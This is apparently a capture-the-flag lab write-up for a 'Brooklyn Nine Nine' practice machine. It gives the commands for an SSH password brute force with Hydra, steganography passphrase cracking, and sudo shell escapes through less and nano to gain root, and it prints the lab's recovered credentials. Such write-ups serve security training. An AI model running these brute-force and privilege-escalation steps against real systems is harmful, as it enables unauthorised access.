As usual i started with rustscan 

rustscan -a 10.10.193.175

Open 10.10.193.175:22
Open 10.10.193.175:21
Open 10.10.193.175:80

saw that ftp has anonymous access allowed entered into ftp directory saw file named 
note_to_jake.txt
downloaded that file using 
get filename

read that file
===================
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
===================

so i though that this is hint to brutforce ssh with user name jake! i started brutforcing ssh with jake as username! and got the password for jake!

===================

hydra -l jake -P ~/Desktop/payloads/wordlist/rockyou.txt 10.10.193.175 ssh -t 23 -Vv -I

[22][ssh] host: 10.10.193.175   login: jake   password: 987654321

logged into the user jake ssh account and ran the command sudo -l 
jake have perms to  run less command with sudo priv
(ALL) NOPASSWD: /usr/bin/less

now time for priv esc! searched for less sudo exploit in gtfobins and got this!

sudo less /etc/profile
!/bin/sh

==================

this will give  you root priv in the nine nine machine
and cheers now you are root!

root@brookly_nine_nine:~# whoami
root
root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)

other way to hack into the machine is!

i opened the website hosted at port 80 and saw the source code! there was a comment given at the bottom related to steganography
<!-- Have you ever heard of steganography? -->

so i though of downloading the image! but how can i download the image given at the main page ! 

just see the source code again! in the .bg class we are givem with the url
there the name of the image file is written ie  brooklyn99.jpg

http://10.10.193.175/brooklyn99.jpg

i just visited that and downloaded the image file : index.jpg

and started searching for embeded files into the image! and though of using steghide but it was asking for passphrase!

steghide --extract -sf index.jpg

so i bruteforce the stego file passphrase with the help of stegseek

syntax : stegseek -wl nameofwordlist -sf stegofilename

this will crack the passphrase of the index.jpg file ie : admin

{you can use another tool too stegcracker to crack the passphrace of the .jpg file 
syntax : stegcracker file wordlist}


now after cracking the password for the stego file you will get a text file which will have the creds for a user!

==================

Holts Password:
fluffydog12@ninenine

==================

Enjoy!!

so here we have password for the user holt

logged in into the machine with ssh creds
ssh holt@ip

and did sudo -l command

==================

(ALL) NOPASSWD: /bin/nano
 here holt user have perms to run nano binary file with sudo priv so i again searched for nano on gtfobins and got this

sudo nano
^R^X
reset; sh 1>&0 2>&0

==================

(in linux ^ represent ctrl)
and now we have root!
